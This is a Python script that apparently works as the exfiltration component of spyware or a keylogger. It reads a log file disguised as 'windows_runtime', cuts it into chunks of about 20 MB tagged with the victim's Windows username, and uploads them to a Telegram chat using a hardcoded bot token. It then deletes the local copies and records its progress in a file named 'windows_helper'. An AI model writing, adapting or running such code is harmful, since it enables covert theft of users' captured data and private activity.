import requests
import os

def send_file(file):
    t_text = open(file, 'rb')
    t_botapikey = 'bot5087313076:AAEpRfvMDzJ6qjdZzbqcz4mYtZdmBQBGF2U'
    t_chatid = '-692624030'
    url = (f'https://api.telegram.org/{t_botapikey}/sendDocument?chat_id={t_chatid}')
    url_txt = requests.post(url, files={'document': t_text})
    payload_txt = {
        "UrlBox":url_txt,
        "AgentList" : "Google Chrome",
        "VersionsList" : "HTTP/1.1",
        "MethodList" : "POST"
    }
    req = requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx", payload_txt)
    return req.status_code


def get_file_size(file):
    fs = os.path.getsize(file)
    fs_original = fs
    suffix = 'B'
    if fs > 1_024:
        suffix = 'KB'
        fs = fs/1_024
        if fs > 1_024:
            suffix = 'MB'
            fs = fs/1_024
            if fs > 1_024:
                suffix = 'GB'
                fs = fs/1_024
    fn = file.split('\\')[-1]
    print(f'[True size] {fn} ({fs:.2f} {suffix})')
    return fs_original


def predict_file_size(string):
    text_size = len(string.encode("utf8"))*1.024
    text_size_original = text_size
    if text_size > 1_024:
        suffix = 'KB'
        text_size = text_size/1_024
        if text_size > 1_024:
            suffix = 'MB'
            text_size = text_size/1_024
            if text_size > 1_024:
                suffix = 'GB'
                text_size = text_size/1_024
    print(f'[Prediction] string ({len(string.encode("utf8"))} chars) ({text_size:.2f} {suffix})')
    return text_size_original


script_path = '\\'.join(__file__.split('\\')[0:-1])+'\\'
log_file_name = "windows_runtime"
log_file_path = script_path + log_file_name
last_line_file_path = script_path + "windows_helper"

with open(last_line_file_path, 'r') as llf:
    last_line = llf.read()

username = os.getenv('username')
log_file = open(log_file_path).readlines()

if last_line == '':
    log_file_size = get_file_size(log_file_path)
    if log_file_size < 20_000_000:
        new_last_line = len(log_file)
    else:
        tl = len(log_file)
        new_last_line = int((tl*20_000_000)/log_file_size)
        predict_file_size(''.join(log_file[0:new_last_line]))
    file_to_send_name = f'{username}_{new_last_line}'
    file_to_send_path = script_path + file_to_send_name
    with open(file_to_send_path, 'w') as fts:
        fts.write(''.join(log_file[0:new_last_line]))
    result = send_file(file_to_send_path)
    if result == 200:
        with open(last_line_file_path, 'w') as llf:
            llf.write(str(new_last_line))
        os.remove(file_to_send_path)
else:
    last_line = int(last_line)
    if last_line == len(log_file):
        exit()
    remaining_file = log_file[last_line:]
    predicted_size = predict_file_size(''.join(remaining_file)) 
    if predicted_size < 20_000_000:
        new_last_line = len(log_file)
    else:
        tl = len(remaining_file)
        new_last_line = int((tl*20_000_000)/predicted_size)  
    file_to_send_name = f'{username}_{new_last_line}'
    file_to_send_path = script_path + file_to_send_name
    with open(file_to_send_path, 'w') as fts:
        fts.write(''.join(log_file[last_line-1:new_last_line]))
    result = send_file(file_to_send_path)
    if result == 200:
        with open(last_line_file_path, 'w') as llf:
            llf.write(str(new_last_line))
        os.remove(file_to_send_path)